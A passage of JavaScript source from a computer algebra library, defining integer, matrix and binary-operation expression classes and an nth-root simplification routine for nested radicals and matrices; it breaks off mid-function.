    return this.equals(Expression.ONE) || this.equals(Expression.ONE.negate());
  };
  Integer.prototype.toExpression = function () {
    return this;
  };
  Integer.prototype.compareTo = function (y) {
    return BigInteger.lessThan(this.value, y.value) ? -1 : (BigInteger.greaterThan(this.value, y.value) ? +1 : 0);
  };
  Integer.prototype.add = function (y) {
    return y.addInteger(this);
  };
  Integer.prototype.addInteger = function (x) {
    return new Integer(BigInteger.add(x.value, this.value));
  };
  Integer.prototype.multiply = function (y) {
    return y.multiplyInteger(this);
  };
  Integer.prototype.multiplyInteger = function (x) {
    return new Integer(BigInteger.multiply(x.value, this.value));
  };
  Integer.prototype.divide = function (y) {
    return y.divideInteger(this);
  };
  //! for performance only
  Integer.prototype.divideInteger = function (x) {
    var y = this;
    if (y.equals(Expression.ZERO)) {
      //TODO: fix?
      throw new RangeError("ArithmeticException");
    }
    var gInteger = integerGCD(x, y);
    if (gInteger.compareTo(Expression.ZERO) < 0) {
      gInteger = gInteger.negate();
    }
    if (y.compareTo(Expression.ZERO) < 0) {
      gInteger = gInteger.negate();
    }
    x = x.truncatingDivide(gInteger);
    y = y.truncatingDivide(gInteger);
    return y.compareTo(Expression.ONE) === 0 ? x : new Division(x, y);
  };
  Integer.prototype.truncatingDivide = function (y) {
    return y.truncatingDivideInteger(this);
  };
  Integer.prototype.truncatingDivideInteger = function (x) {
    var y = this;
    return new Integer(BigInteger.divide(x.value, y.value));
  };
  Integer.prototype.isDivisibleBy = function (y) {
    return y.isDivisibleByInteger(this);
  };
  Integer.prototype.isDivisibleByInteger = function (x) {
    return x.remainder(this).equals(Expression.ZERO);
  };
  Integer.prototype.remainder = function (y) {
    return y.remainderInteger(this);
  };
  Integer.prototype.remainderInteger = function (x) {
    var y = this;
    return new Integer(BigInteger.remainder(x.value, y.value));
  };
  Integer.prototype.primeFactor = function () {
    return integerPrimeFactor(this);
  };
  Integer.prototype.toNumber = function () {
    return BigInteger.toNumber(this.value);
  };
  Integer.prototype.toBigInt = function () {
    return this.toNumber();
    //return typeof BigInt !== "undefined" ? BigInt(this.value) : BigInteger.toNumber(this.value);
  };
  Integer.prototype.toString = function (options) {
    return this.value.toString();
  };

  Integer.fromNumber = function (n) {
    return new Integer(BigInteger.BigInt(n));
  };
  Integer.fromString = function (s) {
    return new Integer(BigInteger.BigInt(s));
  };
  Integer.fromBigInt = function (i) {
    return new Integer(BigInteger.BigInt(i.toString()));
  };

  Expression.ZERO = Integer.fromNumber(0);
  Expression.ONE = Integer.fromNumber(1);
  Expression.TWO = Integer.fromNumber(2);
  Expression.TEN = Integer.fromNumber(10);


  
  Expression.Matrix = function (matrix) {
    //Expression.call(this);
    this.matrix = matrix;
  };

  Expression.Matrix.fromArray = function (rows) {
    return new Expression.Matrix(Matrix.padRows(rows, null));
  };

  Expression.Matrix.prototype = Object.create(Expression.prototype);

  Expression.Matrix.prototype.equals = function (x) {
    if (!(x instanceof Expression.Matrix)) {
      return false;
    }
    return this.matrix.eql(x.matrix);
  };

  Expression.Matrix.prototype.compare4Multiplication = function (x) {
    if (x instanceof Expression.Matrix) {
      return 0;
    }
    return +1;
  };
  Expression.Matrix.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };

  Expression.Matrix.prototype.multiply = function (y) {
    return y.multiplyMatrix(this);
  };
  Expression.prototype.multiplyMatrix = function (x) {
    var t = getIdentityMatrixCoefficient(this);
    if (t != undefined) {
      return new Expression.Matrix(x.matrix.scale(t));
    }
    return this.multiplyExpression(x);
  };
  Expression.Matrix.prototype.multiplyExpression = function (x) {
    var t = getIdentityMatrixCoefficient(x);
    if (t != undefined) {
      return new Expression.Matrix(this.matrix.scale(t));
    }
    return Expression.prototype.multiplyExpression.call(this, x);
  };
  Expression.Matrix.prototype.multiplyMatrix = function (x) {
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("multiply", x, this));
    }
    return new Expression.Matrix(x.matrix.multiply(this.matrix));
  };
  Expression.Matrix.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  Expression.Matrix.prototype.multiplyDivision = Expression.Matrix.prototype.multiplyExpression;
  Expression.Matrix.prototype.add = function (y) {
    return y.addMatrix(this);
  };
  Expression.Matrix.prototype.addMatrix = function (x) {
    return new Expression.Matrix(x.matrix.add(this.matrix));
  };

  var isScalar = function (x) {
    if (x instanceof Integer) {
      return true;
    }
    if (x instanceof Expression.Complex) {
      return true;
    }
    if (x instanceof MatrixSymbol) {
      return false;
    }
    if (x instanceof Expression.Symbol) {
      return true;
    }
    if (x instanceof BinaryOperation) {
      return isScalar(x.a) && isScalar(x.b);
    }
    if (x instanceof Negation) {
      return isScalar(x.b);
    }
    if (x instanceof Expression.Function) {
      return isScalar(x.a);
    }
    return false;//?
  };
  
  Expression.isScalar = isScalar;

  var getIdentityMatrixCoefficient = function (x) {
    var t = undefined;
    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      t = x.a;
    } else if (x instanceof IdentityMatrix) {
      t = Expression.ONE;
    } else if (isScalar(x)) {
      t = x;
    } else if (x instanceof Addition) {
      if (Expression.has(x, IdentityMatrix)) {//TODO: fix
        var ca = getIdentityMatrixCoefficient(x.a);
        var cb = getIdentityMatrixCoefficient(x.b);
        if (ca != undefined && cb != undefined) {
          t = ca.add(cb);
        }
      }
    }
    return t;
  };

  Expression.prototype.addMatrix = function (x) {
    var t = getIdentityMatrixCoefficient(this);
    if (t != undefined) {
      //?
      if (x.matrix.isSquare()) {
        return new Expression.Matrix(Matrix.I(x.matrix.rows()).scale(t)).add(x);
      } else {
        throw new RangeError("NonSquareMatrixException");
      }
    }
    return this.addExpression(x);
  };
  Expression.Matrix.prototype.addExpression = function (x) {
    var t = getIdentityMatrixCoefficient(x);
    if (t != undefined) {
      //?
      if (this.matrix.isSquare()) {
        return this.add(new Expression.Matrix(Matrix.I(this.matrix.rows()).scale(t)));
      } else {
        throw new RangeError("NonSquareMatrixException");
      }
    }
    return Expression.prototype.addExpression.call(this, x);
  };

  Expression.Matrix.prototype.toString = function (options) {
    return this.matrix.toString(setTopLevel(true, options));
  };

  Expression.Matrix.prototype.isExact = function () {
    return this.matrix.isExact();
  };

  function BinaryOperation(a, b) {
    //Expression.call(this);
    this.a = a;
    this.b = b;
  }

  BinaryOperation.prototype = Object.create(Expression.prototype);

  BinaryOperation.prototype.isNegation = function () {
    // TODO: What about NonSimplifiedExpression(s) ?
    //if (this instanceof Multiplication && this.a instanceof NonSimplifiedExpression && this.a.e instanceof Integer && this.a.e.equals(Expression.ONE.negate())) {
    //  return true;
    //}
    return (this instanceof Multiplication && this.a instanceof Integer && this.a.equals(Expression.ONE.negate()));
  };

  var setTopLevel = function (isTopLevel, options) {
    return options == undefined ? {isTopLevel: isTopLevel} : Object.assign({}, options, {isTopLevel: isTopLevel});
  };

  Expression.setTopLevel = setTopLevel;

  BinaryOperation.prototype.toString = function (options) {
    //if (this instanceof Division && this.isNegative()) {
    //  return '-' + this.negateCarefully().toString(options);
    //}
    var a = this.a;
    var b = this.b;
    var isSubtraction = false;
    // TODO: check
    /*
    if (Expression.simplification && this instanceof Addition && a.isNegative()) {
      var tmp = b;
      b = a;
      a = tmp;
    }*/

    if (this instanceof Addition && b.isNegative()) {
      isSubtraction = true;
      b = b.negateCarefully();//?
    }
    var fa = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();
    var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
    if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
      fa = fa || a.isUnaryPlusMinus();
    }
    fb = fb || b.isUnaryPlusMinus(); // 1*-3 -> 1*(-3)
    fb = fb || (this.unwrap() instanceof Exponentiation && b.unwrap() instanceof Exponentiation); // 2^3^4
    fa = fa || (this.unwrap() instanceof Exponentiation && a.unwrap() instanceof Expression.Function); // cos(x)^(2+3)
    var s = isSubtraction ? "-" : this.getS();
    //TODO: fix spaces (matrix parsing)
    if (this.isNegation()) {
      // assert(fa === false);
      return "-" + (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
    }
    return (fa ? "(" : "") + a.toString(setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? ")" : "") + s + (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
  };
  
  //?
  Expression.prototype.unwrap = function () {
    return this;
  };

  function Exponentiation(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Exponentiation.prototype = Object.create(BinaryOperation.prototype);
  
  Exponentiation.prototype.compare4Multiplication = function () {
    return +1;
  };
  Exponentiation.prototype.compare4MultiplicationInteger = function () {
    return -1;
  };

  function Multiplication(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Multiplication.prototype = Object.create(BinaryOperation.prototype);

  Multiplication.prototype.multiply = function (y) {
    return y.multiplyExpression(this);
  };
  //TODO:
  var compare4Multiplication2 = function (x, y) {//TODO: fix

//  && x.n !== y.n
    if (x instanceof NthRoot && y instanceof NthRoot) {//TODO: fix
      if (x.multiply(y).equals(new Expression.Multiplication(x, y))) {
        return -1;
      }
      if (x.multiply(y).equals(new Expression.Multiplication(y, x))) {
        return +1;
      }
      return 0;
    }
/*
    //!2019-04-22
    if (x instanceof NthRoot && y instanceof NthRoot && x.n === y.n) {//TODO: fix
      if (x.a instanceof Integer && y.a instanceof Integer) {
        return 0;
      }
      if (x.a instanceof Addition && y.a instanceof Integer) {
        return 0;//TODO: fix
      }
      if (x.a instanceof Integer && y.a instanceof Addition) {
        return 0;//TODO: fix
      }
      // -(2^0.5+1)^0.5*(2*2^0.5+2)^0.5
      if (x.a instanceof Addition && y.a instanceof Addition) {
        return 0;//TODO: fix
      }
      // 3 and 3^n
      return compare4Multiplication(x.a, y.a);
    }
  */
    if (x instanceof Integer && y instanceof Exponentiation) {
      return -1;//?
    }
    if (x instanceof Exponentiation && y instanceof Integer) {
      return +1;//?
    }

    return compare4Multiplication(getBase(x), getBase(y));
  };

  function Negation(b) {
    //Expression.call(this);
    this.b = b;
  }

  Negation.prototype = Object.create(Expression.prototype);

  Expression.prototype.equalsNegation = function (x) {
    return false;
  };
  Negation.prototype.equalsNegation = function (b) {
    return this.b.equals(b.b);
  };
  Negation.prototype.equals = function (b) {
    return b.equalsNegation();
  };
  Negation.prototype.toString = function (options) {
    var b = this.b;
    var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
    fb = fb || b.isUnaryPlusMinus();
    // assert(fa === false);
    return "-" + (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
  };

  function Subtraction(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Subtraction.prototype = Object.create(BinaryOperation.prototype);

  Subtraction.prototype.getS = function () {
    return "-";
  };

  //

  function Addition(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Addition.prototype = Object.create(BinaryOperation.prototype);
  Addition.prototype.multiply = function (y) {
    return y.multiplyAddition(this);
  };
  Expression.prototype.multiplyAddition = function (x) {
    return x.a.multiply(this).add(x.b.multiply(this));
  };
  Addition.prototype.multiplyExpression = function (x) {
    return x.multiply(this.a).add(x.multiply(this.b));
  };

  function Division(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Division.prototype = Object.create(BinaryOperation.prototype);
  Division.prototype.multiply = function (y) {
    return y.multiplyDivision(this);
  };
  Expression.prototype.multiplyDivision = function (x) {
    return x.a.multiply(this).divide(x.b);
  };
  Division.prototype.multiplyExpression = function (x) {
    return x.multiply(this.a).divide(this.b);
  };
  Division.prototype.add = function (y) {
    return y.addDivision(this);
  };
  Expression.prototype.addDivision = function (x) {
    return x.a.add(this.multiply(x.b)).divide(x.b);
  };
  Division.prototype.addExpression = function (x) {
    return x.multiply(this.b).add(this.a).divide(this.b);
  };
  Division.prototype.divide = function (y) {
    return this.a.divide(this.b.multiply(y));
  };
  Division.prototype.divideExpression = function (x) {
    return x.multiply(this.b).divide(this.a);
  };
  //? not needed, but looks appropriate
  Division.prototype.multiplyAddition = function (x) {
    return x.multiply(this.a).divide(this.b);
  };

  // TODO: move
  Expression.prototype.equals = function (b) {
    throw new RangeError();//?
  };
  Expression.prototype.equalsInteger = function () {
    return false;
  };
  Integer.prototype.equals = function (y) {
    // TODO: fix
    if (y == undefined) {
      return false;
    }
    return y.equalsInteger(this);
  };
  Integer.prototype.equalsInteger = function (x) {
    return x.compareTo(this) === 0;
  };
  Expression.Symbol.prototype.equals = function (b) {
    return b instanceof Expression.Symbol && this.symbol === b.symbol;
  };
  BinaryOperation.prototype.equals = function (b) {
    return b instanceof BinaryOperation && this.getS() === b.getS() && this.a.equals(b.a) && this.b.equals(b.b);
  };

  function MatrixSymbol(symbol) {//TODO: only for square matrix !!!
    Expression.Symbol.call(this, symbol);
  }
  MatrixSymbol.prototype = Object.create(Expression.Symbol.prototype);

  Exponentiation.prototype.inverse = function () {
    return this.pow(Expression.ONE.negate());
  };
  MatrixSymbol.prototype.inverse = function () {//TODO: only for square matrix !!!
    return this.pow(Expression.ONE.negate());
  };
  MatrixSymbol.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationMatrixSymbol(this);
  };
  Expression.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    return +1;
  };
  Expression.Matrix.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    return x instanceof IdentityMatrix ? +1 : -1;//?
  };
  MatrixSymbol.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    var c = Expression.Symbol.prototype.compare4MultiplicationSymbol.call(this, x);
    return c === +1 ? -1 : c;
  };
  MatrixSymbol.prototype.compare4MultiplicationSymbol = function (x) {
    return -1;
  };
  MatrixSymbol.prototype.equals = function (b) {
    return b instanceof MatrixSymbol && Expression.Symbol.prototype.equals.call(this, b);
  };
  MatrixSymbol.prototype.transpose = function () {
    // quick solution:
    return new Expression.Exponentiation(this, new Expression.Symbol("T")); // TODO: fix
  };
  //...

  Expression.MatrixSymbol = MatrixSymbol;

  function IdentityMatrix(symbol) {
    MatrixSymbol.call(this, symbol);
  }
  IdentityMatrix.prototype = Object.create(MatrixSymbol.prototype);
  IdentityMatrix.prototype.multiply = function (y) {
    return y.multiplyIdentityMatrix(this);
  };
  IdentityMatrix.prototype.multiplyAddition = function (x) {
    if (isScalar(x)) {
      return new Multiplication(x, this);
    }
    return Expression.prototype.multiplyAddition.call(this, x);
  };
  Expression.prototype.multiplyIdentityMatrix = function (x) {
    return this.multiplyExpression(x);
  };
  IdentityMatrix.prototype.multiplyIdentityMatrix = function (x) {
    return new IdentityMatrix(this.symbol);
  };
  IdentityMatrix.prototype.addMatrix = function (x) {
    return x.add(new Expression.Matrix(Matrix.I(x.matrix.rows())));
  };
  IdentityMatrix.prototype.add = function (y) {
    return y.addIdentityMatrix(this);
  };
  Expression.prototype.addIdentityMatrix = function (x) {
    return this.addExpression(x);//?
  };
  Expression.Matrix.prototype.addIdentityMatrix = function (x) {
    return new Expression.Matrix(Matrix.I(this.matrix.rows())).add(this);
  };
  IdentityMatrix.prototype.multiplyDivision = function (x) {
    if (isScalar(x)) {
      return new Multiplication(x, this);
    }
    return Expression.prototype.multiplyExpression.call(this, x);
  };

  Expression.IdentityMatrix = IdentityMatrix;

  BinaryOperation.prototype.getS = function () {
    throw new TypeError("abstract");
  };
  Exponentiation.prototype.getS = function () {
    return "^";
  };
  Multiplication.prototype.getS = function () {
    return "*";
  };
  Negation.prototype.getS = function () {
    return "-";
  };
  Addition.prototype.getS = function () {
    return "+";
  };
  Division.prototype.getS = function () {
    return "/";
  };

  Expression.Function = function (name, a) {
    //Expression.call(this);
    this.name = name;
    this.a = a;
  };
  Expression.Function.prototype = Object.create(Expression.prototype);
  Expression.Function.prototype.toString = function (options) {
    //?
    return this.name + "(" + this.a.toString(setTopLevel(true, options)) + ")";
  };
  Expression.Function.prototype.equals = function (b) {
    return b instanceof Expression.Function && this.name === b.name && this.a.equals(b.a);
  };

  Negation.prototype.isUnaryPlusMinus = function () {
    return true;
  };
  BinaryOperation.prototype.isUnaryPlusMinus = function () {
    return this.isNegation();
  };
  Expression.Function.prototype.isUnaryPlusMinus = function () {
    return false;//!
  };
  Expression.prototype.isUnaryPlusMinus = function () {
    return false;
  };
  Integer.prototype.isUnaryPlusMinus = function () {//?
    return this.compareTo(Expression.ZERO) < 0;
  };

  Negation.prototype.getPrecedence = function () {
    return precedence.unary["-"];
  };
  BinaryOperation.prototype.getPrecedence = function () {
    return this.isNegation() ? precedence.unary["-"] : precedence.binary[this.getS()];
  };
  Expression.Function.prototype.getPrecedence = function () {
    return precedence.unary["-"];
  };
  Expression.prototype.getPrecedence = function () {
    return 1000;
  };
  Integer.prototype.getPrecedence = function () {//?
    return this.compareTo(Expression.ZERO) < 0 ? precedence.unary["-"] : 1000;
  };

  Expression.prototype.isNegative = function () {
    var x = this;
    if (x instanceof Integer) {
      return x.compareTo(Expression.ZERO) < 0;
    }
    if (x instanceof Expression.Complex) {
      return x.real.compareTo(Expression.ZERO) < 0 || (x.real.compareTo(Expression.ZERO) === 0 && x.imaginary.compareTo(Expression.ZERO) < 0);
    }
    if (x instanceof Addition) {
      return x.a.isNegative();
      //return x.a.isNegative() && x.b.isNegative();
    }
    if (x instanceof Multiplication) {
      return x.a.isNegative() !== x.b.isNegative();
    }
    if (x instanceof Division) {
      return x.a.isNegative() !== x.b.isNegative();
    }
    if (x instanceof Negation) {
      //return !x.b.isNegative();
      return true;
    }
    return false;
  };

  //TODO: remove
  Expression.prototype.negateCarefully = function () {
    if (this instanceof Integer) {
      return this.negate();
    }
    if (this instanceof Addition) {
      return new Addition(this.a.negateCarefully(), this.b.negateCarefully());
    }
    if (this instanceof Multiplication) {
      return this.b.isNegative() ? new Multiplication(this.a, this.b.negateCarefully()) : (this.a.negateCarefully().equals(Expression.ONE) ? this.b : new Multiplication(this.a.negateCarefully(), this.b));
    }
    if (this instanceof Division) {
      return this.b.isNegative() ? new Division(this.a, this.b.negateCarefully()) : new Division(this.a.negateCarefully(), this.b);
    }
    if (this instanceof Negation) {
      return this.b;//!
    }
    return this.negate();
  };

  // https://en.wikipedia.org/wiki/Nth_root#Simplified_form_of_a_radical_expression
  // https://en.wikipedia.org/wiki/Factorization#Sum.2Fdifference_of_two_cubes

  function NthRoot(name, a, n) {
    Expression.Function.call(this, name, a);
    this.n = n;
  }

  NthRoot.prototype = Object.create(Expression.Function.prototype);

  NthRoot.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationNthRoot(this);
  };
  NthRoot.prototype.compare4MultiplicationInteger = function (x) {
    return -1;
  };
  NthRoot.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  NthRoot.prototype.compare4MultiplicationNthRoot = function (x) {
    return x.n < this.n ? -1 : (x.n > this.n ? + 1 : 0);
  };

  NthRoot.prototype.toString = function (options) {
    var fa = this.a.getPrecedence() <= this.getPrecedence();
    return (fa ? "(" : "") + this.a.toString(setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? ")" : "") + "^" + (this.n === 2 ? "0.5" : "(1/" + this.n + ")");
  };

  NthRoot.prototype.getDegree = function () {
    return this.n;
  };
  
  function ngcd(a, b) {
    while (b != 0) {
      var t = a % b;
      a = b;
      b = t;
    }
    return a;
  }
  function isPrime(n) {
    if (typeof n === "bigint") {//TODO: ?
      return n === BigInt(primeFactor(BigInteger.BigInt(n.toString())).toString());
    }
    return n === primeFactor(n);
  }

  function sortKeys(object) {
    var keys = [];
    for (var key in object) {
      if (Object.prototype.hasOwnProperty.call(object, key)) {
        keys.push(Number.parseInt(key, 10));
      }
    }
    keys.sort(function (a, b) {
      return a - b;
    });
    var result = {};
    for (var i = 0; i < keys.length; i++) {
      result[keys[i]] = object[keys[i]];
    }
    return result;
  }
  
  function isPerfectCube(d) {
    return d._nthRoot(3) instanceof Expression.Integer;
  }

  Expression.prototype._nthRoot = function (n) {
    if (n > 9007199254740991) {
      throw new RangeError("NotSupportedError");
    }
    var x = this;

    if (n === 2) {
      if (x instanceof Addition) {
        if ((x.a instanceof SquareRoot || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) && x.b instanceof Integer) {
          // (5^0.5+3)/2 or (-5^0.5+3)/2
          var u = x.a;
          var v = x.b;
          // (a+b)^2 = aa+2ab+bb = u+v
          // 2ab = u, b = u/(2a)
          // aa+bb = v, 4aaaa - 4vaa + uu = 0
          // t = sqrt(v*v-u*u);
          // a = sqrt(v+t)/sqrt(2)
          // b = sqrt(v-t)/sqrt(2)
          var tt = v.multiply(v).subtract(u.multiply(u));
          var t = tt instanceof Integer && tt.compareTo(Expression.ZERO) >= 0 ? tt.squareRoot() : undefined;
          if (t != undefined && (t instanceof Integer)) {//?
            var aa = v.add(t);
            var a = aa.compareTo(Expression.ZERO) >= 0 ? aa.squareRoot().divide(Expression.TWO.squareRoot()) : undefined;
            if (a != undefined) {
              var b = u.divide(Expression.TWO.multiply(a));
              return a.add(b);
            }
          }
        }
        //TODO: https://brownmath.com/alge/nestrad.htm  - √(√392 + √360)
        if ((x.a instanceof SquareRoot || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) && 
            (x.b instanceof SquareRoot || x.b instanceof Multiplication && x.b.a instanceof Integer && x.b.b instanceof SquareRoot)) {
          var a = x.a;
          var b = x.b;
          var aa = a.multiply(a);
          var bb = b.multiply(b);
          var g = aa.gcd(bb).squareRoot();
          if (!g.equals(Expression.ONE)) {
            var v = a.divide(g).add(b.divide(g)).squareRoot().multiply(g.squareRoot());
            if (typeof hit === "function") {
              hit({rootFromAddition: x.toString()});
            }
            return v;
          }
        }
      }
    }
    if (n === 3) {//? new: 2019-08-18
      if (x instanceof Addition) {
        if ((x.a instanceof SquareRoot || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) && x.b instanceof Integer) {
          // (5^0.5+3)/2 or (-5^0.5+3)/2
          var u = x.a;
          var v = x.b;
          var d = u.multiply(u).subtract(v.multiply(v));
          if (isPerfectCube(d)) {//?
            // (a+b)^3 = aaa+3aab+3bba+bbb = u+v
            // aaa+3bba = v, bb=(v-aaa)/(3a)
            // 3aab+bbb = u, b(3aa+bb)=u, b=u/(3aa+bb), bb=u**2/(3aa+bb)**2
            // (9aaa+(v-aaa))**2*(v-aaa) = 27*aaa*u**2

            // t = aaa
            // (9t+(v-t))**2*(v-t) = 27*t*u**2

            var t = new Expression.Symbol('t');
            //var eq = ExpressionParser.parse('(9t+(v-t))**2*(v-t) - 27*t*u**2', new RPN.Context(function (id) {
            //  return id === 'v' ? v : (id === 'u' ? u : (id === 't' ? t : undefined));
            //})).simplify();
            var NINE = Expression.Integer.fromNumber(9);
            var TWENTY_SEVEN = Expression.Integer.fromNumber(27);
            var eq = Expression.pow(NINE.multiply(t).add(v.subtract(t)), 2).multiply(v.subtract(t)).subtract(TWENTY_SEVEN.multiply(t).multiply(Expression.pow(u, 2)));
            var p = Polynomial.toPolynomial(eq, t);
            p = p.scale(p.getContent().inverse());
            var t = p.doRationalRootTest();
            if (t != null) {
              var a = t._nthRoot(3);
              var b = v.subtract(t).divide(a).divide(Expression.Integer.fromNumber(3))._nthRoot(2);
              return a.add(b);
            }
          }
        }
      }
    }

    //?
    if (x instanceof NthRoot) {
      if (typeof hit === "function") {
        hit({rootFromRoot: ""});
      }
      return x.a._nthRoot(x.n * n);
    }
    if (x instanceof Division || x instanceof Multiplication) {
      if (n % 2 !== 0 || x.a instanceof Integer && x.a.compareTo(Expression.ZERO) > 0 ||
                         x.b instanceof Integer && x.b.compareTo(Expression.ZERO) > 0) {//TODO: fix
        if (x instanceof Division) {
          return x.a._nthRoot(n).divide(x.b._nthRoot(n));
        }
        if (x instanceof Multiplication) {
          return x.a._nthRoot(n).multiply(x.b._nthRoot(n));
        }
      }
    }
    var qi = x instanceof Integer ? x : null;
    var qq = QuadraticInteger.toQuadraticInteger(x);
    // sqrt(2sqrt(2)+2) "(2*2^0.5+2)^0.5"
    // sqrt(sqrt(2)+2) "(2^0.5+1)^0.5*2^(1/4)"
    // sqrt(4sqrt(2)+4) 2*(2^0.5+1)^0.5
    // sqrt(2sqrt(2)+4) (2*2^0.5+2)^0.5*2^(1/4)

    //TODO: fix for !isPrime(qq.D)
    //if (qq != null && (isPrime(qq.D) && (qq.a / ngcd(qq.a, qq.b)) % qq.D == 0 || !isPrime(qq.D) && qq.a % qq.D == 0 && ngcd(qq.a, qq.b) % qq.D != 0)) {
      //var D = Expression.Integer.fromNumber(qq.D)._nthRoot(2);
      //return D._nthRoot(n).multiply(x.divide(D)._nthRoot(n));
    //}
    
    //!
    if (qq == null && x instanceof Expression.Addition) {
      if (x.a instanceof Multiplication && x.b instanceof Multiplication) {
        var g = x.a.pow(Expression.TWO).gcd(x.b.pow(Expression.TWO)).squareRoot();
        if (!g.equals(Expression.ONE)) {
          return g._nthRoot(n).multiply(x.divide(g)._nthRoot(n));
        }
      }
    }
    //!

    if (qq != null) {
      if (n !== 2 && n % 2 === 0) {
        //TODO: check
        return x.squareRoot()._nthRoot(n / 2);
      }
      if (n === 2 || n === 3 && qq.isValid()) {//Note: isValid should be checked here
      //if (qq.norm() === -1 * Math.pow(ngcd(qq.a, qq.b), 2)) {
        if (qq.isPositive()) {
        qi = qq;
        } else {
          return Expression.ONE.negate()._nthRoot(n).multiply(this.negate()._nthRoot(n));
        }
      //}
      }
    }
    if (qi != null) {
      x = qi;//TODO:
      if (x instanceof Integer && x.compareTo(Expression.ZERO) < 0) {
        if (n % 2 === 0) {
          if (n === 2) {//TODO: ?
            return Expression.I.multiply(this.negate()._nthRoot(n));
          }
          throw new RangeError("NotSupportedError");
        }
        return this.negate()._nthRoot(n).negate();
      }
      if (x.equals(Expression.ZERO)) {
        return this;
      }
      var makeRoot = function (i, n) {
        return n === 1 ? i : (n === 2 ? new SquareRoot(i) : (n === 3 ? new CubeRoot(i) : new NthRoot("n" + "-root", i, n)));
      };
      var roots = {};
      var i = x;
      while (!i.equals(Expression.ONE)) {
        var d = i.primeFactor();
        if (d instanceof QuadraticInteger) {
          if (n !== 2 && n !== 3) {
            throw new TypeError(); // "assertion"
          }
          if (d.a * d.b < 0) {
            return x.toExpression().divide(Expression.pow(d.toExpression(), n))._nthRoot(n).multiply(d.toExpression());
          }
          var s = d.norm();
          // https://brownmath.com/alge/nestrad.htm#SurveyDoable
          var isPerfectSquare = function (n) {
            if (typeof n === "number") {
              return Math.pow(Math.floor(Math.sqrt(n) + 0.5), 2) === n;
            }
            var s = BigInt(nthRoot(BigInteger.BigInt(n.toString()), 2).toString());
            return s * s === n;
          };
          //TODO: s >= 0 - ?
          if (d.b != 0 && d.a != 0 && s >= 0 && isPerfectSquare(s)) {
            if (n === 2) {
            return x.toExpression().divide(d.toExpression())._nthRoot(2).multiply(d.toExpression()._nthRoot(2));
            }
          }
        }
        var e = 0;
        if (i.isUnit()) {
          //TODO: 
          // d should be a https://en.wikipedia.org/wiki/Fundamental_unit_(number_theory)
          while (!i.equals(Expression.ONE)) {
            i = i.truncatingDivide(d);
            e += 1;
          }
        } else {
          while (i.isDivisibleBy(d)) {
            i = i.truncatingDivide(d);
            e += 1;
          }
        }
        d = d.toExpression();
        var nn = n;
        if (d instanceof NthRoot) {
          nn *= d.n;
          d = d.a;
        }
        var t = ngcd(nn, e);
        nn /= t;//?
        e /= t;//?

        while (e !== 0) {
          //var g = e;
          //while (nn % g !== 0) {
          //  g -= 1;
          //}
          var g = e >= nn ? nn : 1;

          var e1 = Math.floor(e / g);
          var k = Math.floor(nn / g);
          roots[k] = (roots[k] || Expression.ONE).multiply(Expression.pow(d, e1));

          e = e - g * e1; // e = e % g;
        }
      }
      var y = Expression.ONE;
      roots = sortKeys(roots);
      //for (var j = 1; j <= n; j += 1) {
      //}
      // `for-in` loop is used to have better performance for "a sparse array"
      var f = roots["1"];
      for (var jj in roots) {//TODO: fix the iteration order
        if (Object.prototype.hasOwnProperty.call(roots, jj)) {
        if (jj !== "1") {
          var j = Number.parseInt(jj, 10);
          var r = roots[jj];
          //y = y.multiply(makeRoot(r, j));
          var x = makeRoot(r, j);
          if (y !== Expression.ONE) {
            y = new Expression.Multiplication(y, x);
          } else {
            y = x;
          }
        }
        }
      }
      if (f != null) {
        y = f.multiply(y);
      }
      return y;
    }
    if (x instanceof Expression.Matrix) {
      if (typeof hit === "function") {
        hit(n === 2 ? {squareRoot: "matrix"} : (n === 3 ? {cubeRoot: "matrix"} : {nthRoot: "Matrix^(1/" + n + ")"}));
      }
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("nth-root-using-diagonalization", x));
      }
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("diagonalize", x));
      }
      var tmp = Expression.getEigenvalues(x.matrix);
      var eigenvalues = tmp.eigenvalues;
      var multiplicities = tmp.multiplicities;
      if (Expression.sum(multiplicities) === x.matrix.cols()) {
        var tmp2 = Expression.getEigenvectors(x.matrix, eigenvalues);
        var eigenvectors = tmp2.eigenvectors;
        if (eigenvectors.length === x.matrix.cols()) {
          var tmp = Expression.diagonalize(x.matrix, eigenvalues, multiplicities, eigenvectors);
          var L = tmp.L;
          var SL = L.map(function (e, i, j) {
            return i === j ? e._nthRoot(n) : e;
          });
          return new Expression.Matrix(tmp.T.multiply(SL).multiply(tmp.T_INVERSED));
        } else {
          var rootOfJordanForm = function (J, n) {
            var tmp = J.map(function (e, i, j) {
              if (i > j) {
                return Expression.ZERO;
              }
              if (i === j) {
                return J.e(i, j)._nthRoot(n);
              }
              if (J.e(i, i + 1).equals(Expression.ZERO)) {
                return Expression.ZERO;
              }
              if (i + 1 === j) {
